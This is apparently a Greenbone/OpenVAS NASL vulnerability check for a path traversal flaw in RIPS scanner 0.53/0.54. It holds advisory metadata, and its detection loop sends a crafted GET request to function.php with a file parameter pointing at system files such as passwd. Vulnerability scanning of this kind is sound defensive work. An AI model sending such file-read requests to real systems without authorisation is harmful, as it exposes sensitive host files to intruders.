# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:rips_scanner:rips";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103375");
  script_version("2025-07-18T05:44:10+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-07-18 05:44:10 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2012-01-02 09:57:26 +0100 (Mon, 02 Jan 2012)");
  # nb:
  # - Flaw is from late 2011/early 2012 but the VulnCheck CNA had assigned a 2025 for this so don't
  #   wonder about the huge gap between creation_date and CVE publishing time
  # - It seems the CVE also got assigned for multiple issues, for example the CVE is linking to the
  #   EDB entry 18660 which is from 2012 and thus is for this flaw. But the CVE is also linking to a
  #   blog post from 2015 which seems to be about what is getting checked in
  #   2016/gb_rips_lfi_vuln.nasl. Due to this the CVE has been added to both VTs for now.
  script_cve_id("CVE-2025-34126");
  script_name("RIPS Scanner Path Traversal Vulnerability (Dec 2011)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_rips_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("rips/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/18660");
  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/rips-scanner-path-traversal");
  # nb: No archive.org link available (also not on the main page) but still kept included here
  # as a reference.
  script_xref(name:"URL", value:"http://c0ntex.blogspot.com/2011/12/rip-rips.html");

  script_tag(name:"summary", value:"RIPS scanner is prone to a path traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of the webserver process.
  This may allow the attacker to compromise the application and the computer, other attacks are
  also possible.");

  script_tag(name:"affected", value:"RIPS scanner versions 0.53 and 0.54 are known to be affected.
  Other versions might be affected as well.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  url = dir + "/windows/function.php?file=/" + files[file] + "&start=0&end=10";
  if( http_vuln_check( port:port, url:url, pattern:file, extra_check:make_list( "phps-t" ) ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
